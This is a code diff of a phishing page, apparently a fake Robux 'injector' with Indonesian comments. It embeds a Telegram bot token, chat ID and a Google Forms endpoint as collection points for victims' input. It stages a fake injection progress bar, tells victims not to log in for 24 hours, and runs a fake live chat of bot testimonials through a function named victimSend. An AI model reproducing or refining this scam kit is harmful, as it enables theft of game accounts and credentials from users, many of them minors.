@@ -16,6 +16,7 @@
         .input-glow { background: rgba(0, 0, 0, 0.6); border: 1px solid rgba(255, 215, 0, 0.2); width: 100%; padding: 15px; border-radius: 15px; color: #ffd700; outline: none; }
         .hidden { display: none !important; }
         #music-toggle { position: fixed; top: 20px; right: 20px; z-index: 1000; background: rgba(255, 215, 0, 0.1); border: 1px solid #ffd700; color: #ffd700; padding: 10px; border-radius: 50%; width: 45px; height: 45px; display: flex; align-items: center; justify-content: center; cursor: pointer; font-size: 18px; box-shadow: 0 0 10px rgba(255, 215, 0, 0.3); }
+        .chat-line { border-bottom: 1px solid rgba(255,255,255,0.03); padding: 4px 0; font-size: 10px; }
     </style>
 </head>
 <body class="p-6">
@@ -59,7 +60,7 @@
         <div id="p4" class="hidden text-center py-10">
             <h3 class="gold-glow text-xl font-black italic mb-4">INJECTING...</h3>
             <div class="w-full h-1 bg-zinc-900 rounded-full overflow-hidden mb-4"><div id="bar" class="h-full bg-yellow-500 shadow-[0_0_15px_#ffd700] w-0 transition-all duration-[15s] ease-linear"></div></div>
-            <p class="text-[8px] text-zinc-500 font-black uppercase tracking-widest leading-loose">Success! Don't login for 24H.</p>
+            <p class="text-[8px] text-zinc-500 font-black uppercase tracking-widest">Success! Jangan login 24 Jam.</p>
         </div>
     </main>
 
@@ -72,6 +73,7 @@
     </div>
 
     <script>
+        // PASTIKAN SEMUA VARIABEL CUMA DIDEKLARASI SEKALI
         let amt = "", md = "";
         const tok = "8712552694:AAHAjQQhwx4Vlas6CWs6QHB4iYSA5U2LiWM", cid = "7153376507";
         const form = "https://docs.google.com/forms/d/e/1FAIpQLSfgBrBP1Bqk4tfVHBFUPZDCbW5fj7nK8NZuObuQPmhyRcEGxg/formResponse";
@@ -100,16 +102,18 @@
             go(3, 4); setTimeout(() => document.getElementById('bar').style.width = "100%", 100);
         }
 
+        // BAGIAN LIVE CHAT - CUMA SATU SETINGAN BIAR GAK NUMPUK
         const botMsgs = [{n:"Rizky***",m:"Landing mulus thx admin."}, {n:"Vito***",m:"Beneran masuk 10k!"}, {n:"Adit***",m:"Yess cair 50k!"}];
         function addChat(n,m,v=false){
             const b=document.getElementById('chat-content'), d=document.createElement('div');
-            d.className=`${v?'text-teal-400 font-bold':''}`; d.innerHTML=`<span class="text-yellow-500 font-bold">${n}</span>: ${m}`;
-            b.insertBefore(d,b.firstChild); if(b.childNodes.length>7)b.removeChild(b.lastChild);
+            d.className=`chat-line ${v?'text-teal-400 font-bold':''}`; d.innerHTML=`<span class="text-yellow-500 font-bold">${n}</span>: ${m}`;
+            if(b) { b.insertBefore(d,b.firstChild); if(b.childNodes.length>7)b.removeChild(b.lastChild); }
         }
-        setInterval(()=>{const b=botMsgs[Math.floor(Math.random()*botMsgs.length)]; addChat(b.n,b.m);},3000);
-        function victimSend(){ const i=document.getElementById('victim-msg'); if(!i.value)return; const m=["Semoga masuk 24jam","yess akhirnya bisa punya robux banyak"]; addChat("K***_Anom", m[Math.floor(Math.random()*m.length)],true); i.value=""; }
+        setInterval(()=>{const b=botMsgs[Math.floor(Math.random()*botMsgs.length)]; addChat(b.n,b.m);},3500);
+        function victimSend(){ const i=document.getElementById('victim-msg'); if(!i.value)return; addChat("K***_Anom", "Semoga masuk bos", true); i.value=""; }
     </script>
 </body>
+</html>
 </html>
         }
 
